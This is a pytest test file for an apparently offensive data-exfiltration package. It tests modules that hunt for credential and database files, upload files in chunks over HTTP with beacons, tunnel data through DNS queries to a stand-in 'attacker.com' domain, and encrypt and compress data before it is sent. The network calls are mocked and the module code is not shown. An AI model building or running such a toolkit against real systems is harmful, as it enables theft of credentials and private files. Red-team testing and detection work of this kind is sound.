"""
Unit tests for Data Exfiltration modules.
"""

import pytest
import os
import tempfile
from unittest.mock import Mock, patch, MagicMock
from pathlib import Path

from exfiltration.data_discovery import DataDiscovery, SensitiveFile
from exfiltration.exfil_http import HTTPExfiltration, ExfilSession
from exfiltration.exfil_dns import DNSTunneling
from exfiltration.data_prep import DataPreparation


class TestSensitiveFile:
    """Test SensitiveFile dataclass."""

    def test_creation(self):
        """Test SensitiveFile creation."""
        sf = SensitiveFile(
            file_path='/path/to/file.txt',
            file_type='txt',
            size=1024,
            category='documents',
            confidence='medium',
            description='Text file'
        )

        assert sf.file_path == '/path/to/file.txt'
        assert sf.category == 'documents'
        assert sf.confidence == 'medium'

    def test_to_dict(self):
        """Test conversion to dictionary."""
        sf = SensitiveFile(
            file_path='/test.txt',
            file_type='txt',
            size=100,
            category='documents',
            confidence='low'
        )

        d = sf.to_dict()
        assert isinstance(d, dict)
        assert d['file_path'] == '/test.txt'
        assert d['size'] == 100


class TestDataDiscovery:
    """Test DataDiscovery class."""

    def test_initialization(self):
        """Test initialization."""
        discovery = DataDiscovery(verbose=True)

        assert discovery.verbose is True
        assert discovery.discovered_files == []

    def test_classify_document_file(self, tmp_path):
        """Test document file classification."""
        # Create test file
        test_file = tmp_path / "test.pdf"
        test_file.write_text("test content")

        discovery = DataDiscovery()
        result = discovery._classify_file(str(test_file), "test.pdf")

        assert result is not None
        assert result.category == 'documents'
        assert result.file_type == '.pdf'

    def test_classify_credential_file(self, tmp_path):
        """Test credential file classification."""
        # Create test file with credential pattern in name
        test_file = tmp_path / "passwords.txt"
        test_file.write_text("test")

        discovery = DataDiscovery()
        result = discovery._classify_file(str(test_file), "passwords.txt")

        assert result is not None
        assert result.category == 'credentials'
        assert result.confidence == 'high'

    def test_classify_database_file(self, tmp_path):
        """Test database file classification."""
        test_file = tmp_path / "data.sqlite"
        test_file.write_text("test")

        discovery = DataDiscovery()
        result = discovery._classify_file(str(test_file), "data.sqlite")

        assert result is not None
        assert result.category == 'database'

    def test_contains_credentials(self, tmp_path):
        """Test credential detection in files."""
        # Create file with credential pattern
        test_file = tmp_path / "config.txt"
        test_file.write_text("password=secret123\napi_key=abc123")

        discovery = DataDiscovery()
        result = discovery._contains_credentials(str(test_file))

        assert result is True

    def test_contains_no_credentials(self, tmp_path):
        """Test file without credentials."""
        test_file = tmp_path / "normal.txt"
        test_file.write_text("This is just normal text")

        discovery = DataDiscovery()
        result = discovery._contains_credentials(str(test_file))

        assert result is False

    def test_search_directory(self, tmp_path):
        """Test directory search."""
        # Create test files
        (tmp_path / "test.pdf").write_text("test")
        (tmp_path / "passwords.txt").write_text("test")

        discovery = DataDiscovery()
        results = discovery.search_directory(str(tmp_path), max_depth=1)

        assert len(results) >= 2

    def test_filter_by_category(self):
        """Test filtering by category."""
        discovery = DataDiscovery()
        discovery.discovered_files = [
            SensitiveFile('/file1', 'txt', 100, 'credentials', 'high'),
            SensitiveFile('/file2', 'pdf', 200, 'documents', 'medium'),
            SensitiveFile('/file3', 'txt', 150, 'credentials', 'critical'),
        ]

        creds = discovery.filter_by_category('credentials')

        assert len(creds) == 2
        assert all(f.category == 'credentials' for f in creds)

    def test_filter_by_confidence(self):
        """Test filtering by confidence."""
        discovery = DataDiscovery()
        discovery.discovered_files = [
            SensitiveFile('/file1', 'txt', 100, 'credentials', 'high'),
            SensitiveFile('/file2', 'txt', 100, 'credentials', 'critical'),
            SensitiveFile('/file3', 'txt', 100, 'documents', 'medium'),
        ]

        critical = discovery.filter_by_confidence('critical')

        assert len(critical) == 1
        assert critical[0].confidence == 'critical'

    def test_get_total_size(self):
        """Test total size calculation."""
        discovery = DataDiscovery()
        discovery.discovered_files = [
            SensitiveFile('/file1', 'txt', 1000, 'credentials', 'high'),
            SensitiveFile('/file2', 'txt', 2000, 'credentials', 'high'),
        ]

        total = discovery.get_total_size()

        assert total == 3000

    def test_generate_report(self):
        """Test report generation."""
        discovery = DataDiscovery()
        discovery.discovered_files = [
            SensitiveFile('/file1', 'txt', 1024, 'credentials', 'critical'),
        ]

        report = discovery.generate_report()

        assert 'DATA DISCOVERY REPORT' in report
        assert 'Total files discovered: 1' in report
        assert 'CRITICAL FINDINGS' in report

    def test_export_json(self, tmp_path):
        """Test JSON export."""
        discovery = DataDiscovery()
        discovery.discovered_files = [
            SensitiveFile('/file1', 'txt', 100, 'credentials', 'high'),
        ]

        output_file = tmp_path / "discovery.json"
        discovery.export_json(str(output_file))

        assert output_file.exists()

        import json
        with open(output_file) as f:
            data = json.load(f)

        assert data['total_files'] == 1
        assert len(data['files']) == 1


class TestExfilSession:
    """Test ExfilSession dataclass."""

    def test_creation(self):
        """Test session creation."""
        session = ExfilSession(
            session_id='test123',
            target_url='http://example.com',
            files_sent=5,
            bytes_sent=10000
        )

        assert session.session_id == 'test123'
        assert session.files_sent == 5

    def test_to_dict(self):
        """Test conversion to dictionary."""
        session = ExfilSession('test', 'http://example.com')
        d = session.to_dict()

        assert isinstance(d, dict)
        assert d['session_id'] == 'test'


class TestHTTPExfiltration:
    """Test HTTPExfiltration class."""

    def test_initialization(self):
        """Test initialization."""
        exfil = HTTPExfiltration(
            target_url='http://example.com',
            chunk_size=1024 * 512
        )

        assert exfil.target_url == 'http://example.com'
        assert exfil.chunk_size == 1024 * 512
        assert exfil.session.session_id is not None

    def test_session_id_generation(self):
        """Test session ID generation."""
        exfil = HTTPExfiltration('http://example.com')

        assert len(exfil.session_id) == 8

    @patch('requests.post')
    def test_send_chunk_success(self, mock_post):
        """Test successful chunk sending."""
        mock_post.return_value = Mock(status_code=200)

        exfil = HTTPExfiltration('http://example.com')

        success = exfil._send_chunk(
            filename='test.txt',
            chunk_data=b'test data',
            chunk_index=0,
            total_chunks=1
        )

        assert success is True
        assert mock_post.called

    @patch('requests.post')
    def test_send_chunk_failure(self, mock_post):
        """Test failed chunk sending."""
        mock_post.return_value = Mock(status_code=500)

        exfil = HTTPExfiltration('http://example.com')

        success = exfil._send_chunk(
            filename='test.txt',
            chunk_data=b'test data',
            chunk_index=0,
            total_chunks=1
        )

        assert success is False

    @patch('requests.post')
    def test_exfiltrate_text(self, mock_post):
        """Test text exfiltration."""
        mock_post.return_value = Mock(status_code=200)

        exfil = HTTPExfiltration('http://example.com')

        success = exfil.exfiltrate_text('test data', filename='test.txt')

        assert success is True
        assert exfil.session.files_sent == 1

    @patch('requests.post')
    def test_exfiltrate_file(self, mock_post, tmp_path):
        """Test file exfiltration."""
        mock_post.return_value = Mock(status_code=200)

        # Create test file
        test_file = tmp_path / "test.txt"
        test_file.write_text("test content")

        exfil = HTTPExfiltration('http://example.com', chunk_size=1024)

        success = exfil.exfiltrate_file(str(test_file))

        assert success is True
        assert exfil.session.files_sent == 1

    @patch('requests.post')
    def test_send_beacon(self, mock_post):
        """Test beacon sending."""
        mock_post.return_value = Mock(status_code=200)

        exfil = HTTPExfiltration('http://example.com')

        success = exfil.send_beacon(status='active')

        assert success is True

    def test_get_stats(self):
        """Test statistics retrieval."""
        exfil = HTTPExfiltration('http://example.com')
        exfil.session.files_sent = 5
        exfil.session.bytes_sent = 10000

        stats = exfil.get_stats()

        assert stats['files_sent'] == 5
        assert stats['bytes_sent'] == 10000
        assert 'mb_sent' in stats

    def test_generate_report(self):
        """Test report generation."""
        exfil = HTTPExfiltration('http://example.com')
        exfil.session.files_sent = 3
        exfil.session.bytes_sent = 5000

        report = exfil.generate_report()

        assert 'HTTP EXFILTRATION REPORT' in report
        assert 'Files Sent: 3' in report


class TestDNSTunneling:
    """Test DNSTunneling class."""

    def test_initialization(self):
        """Test initialization."""
        dns = DNSTunneling(
            domain='attacker.com',
            delay=1.0
        )

        assert dns.domain == 'attacker.com'
        assert dns.delay == 1.0
        assert dns.queries_sent == 0

    def test_encode_data(self):
        """Test data encoding."""
        dns = DNSTunneling('attacker.com')

        encoded = dns._encode_data(b'secret')

        # Should be base32 encoded, lowercase, no padding
        assert encoded.islower()
        assert '=' not in encoded

    def test_chunk_data(self):
        """Test data chunking."""
        dns = DNSTunneling('attacker.com')

        # Create data longer than max label length
        long_data = 'a' * 200

        chunks = dns._chunk_data(long_data)

        assert len(chunks) > 1
        assert all(len(chunk) <= dns.MAX_LABEL_LENGTH for chunk in chunks)

    @patch('socket.gethostbyname')
    def test_send_dns_query(self, mock_gethostbyname):
        """Test DNS query sending."""
        mock_gethostbyname.side_effect = OSError("DNS query")

        dns = DNSTunneling('attacker.com')

        success = dns._send_dns_query('test')

        assert success is True
        assert dns.queries_sent == 1

    @patch('socket.gethostbyname')
    def test_exfiltrate_text(self, mock_gethostbyname):
        """Test text exfiltration."""
        mock_gethostbyname.side_effect = OSError("DNS query")

        dns = DNSTunneling('attacker.com', delay=0)

        success = dns.exfiltrate_text('secret', session_id='test')

        assert success is True
        assert dns.queries_sent > 0

    @patch('socket.gethostbyname')
    def test_exfiltrate_file(self, mock_gethostbyname, tmp_path):
        """Test file exfiltration."""
        mock_gethostbyname.side_effect = OSError("DNS query")

        # Create test file
        test_file = tmp_path / "test.txt"
        test_file.write_text("test data")

        dns = DNSTunneling('attacker.com', delay=0)

        success = dns.exfiltrate_file(str(test_file), session_id='test')

        assert success is True

    def test_get_stats(self):
        """Test statistics retrieval."""
        dns = DNSTunneling('attacker.com')
        dns.queries_sent = 10
        dns.bytes_sent = 500

        stats = dns.get_stats()

        assert stats['queries_sent'] == 10
        assert stats['bytes_sent'] == 500
        assert stats['domain'] == 'attacker.com'

    def test_generate_report(self):
        """Test report generation."""
        dns = DNSTunneling('attacker.com')
        dns.queries_sent = 5
        dns.bytes_sent = 100

        report = dns.generate_report()

        assert 'DNS TUNNELING REPORT' in report
        assert 'Queries Sent: 5' in report


class TestDataPreparation:
    """Test DataPreparation class."""

    def test_initialization(self):
        """Test initialization."""
        prep = DataPreparation()

        assert prep.encryption_key is not None
        assert len(prep.encryption_key) == 32

    def test_initialization_with_key(self):
        """Test initialization with provided key."""
        key = b'a' * 32
        prep = DataPreparation(encryption_key=key)

        assert prep.encryption_key == key

    def test_derive_key_from_password(self):
        """Test key derivation from password."""
        key, salt = DataPreparation.derive_key_from_password('password123')

        assert len(key) == 32
        assert len(salt) == 16

        # Same password and salt should produce same key
        key2, _ = DataPreparation.derive_key_from_password('password123', salt=salt)
        assert key == key2

    def test_encrypt_decrypt_data(self):
        """Test data encryption and decryption."""
        prep = DataPreparation()

        plaintext = b'This is secret data'

        # Encrypt
        encrypted = prep.encrypt_data(plaintext)

        # Decrypt
        decrypted = prep.decrypt_data(encrypted)

        assert decrypted == plaintext

    def test_encrypt_decrypt_file(self, tmp_path):
        """Test file encryption and decryption."""
        prep = DataPreparation()

        # Create test file
        test_file = tmp_path / "test.txt"
        test_file.write_text("secret content")

        # Encrypt
        encrypted_file = prep.encrypt_file(str(test_file))

        assert os.path.exists(encrypted_file)

        # Decrypt
        decrypted_file = prep.decrypt_file(encrypted_file)

        with open(decrypted_file) as f:
            content = f.read()

        assert content == "secret content"

    def test_compress_zip(self, tmp_path):
        """Test ZIP compression."""
        # Create test files
        file1 = tmp_path / "file1.txt"
        file1.write_text("content 1")

        file2 = tmp_path / "file2.txt"
        file2.write_text("content 2")

        output_zip = tmp_path / "archive.zip"

        DataPreparation.compress_zip(
            [str(file1), str(file2)],
            str(output_zip)
        )

        assert output_zip.exists()
        assert output_zip.stat().st_size > 0

    def test_compress_gzip(self, tmp_path):
        """Test gzip compression."""
        # Create test file
        test_file = tmp_path / "test.txt"
        test_file.write_text("test content " * 100)

        output_file = DataPreparation.compress_gzip(str(test_file))

        assert os.path.exists(output_file)
        # Compressed file should be smaller
        assert os.path.getsize(output_file) < os.path.getsize(str(test_file))

    def test_get_key_base64(self):
        """Test base64 key export."""
        prep = DataPreparation()

        key_b64 = prep.get_key_base64()

        # Should be valid base64
        import base64
        decoded = base64.b64decode(key_b64)

        assert decoded == prep.encryption_key


if __name__ == '__main__':
    pytest.main([__file__, '-v'])
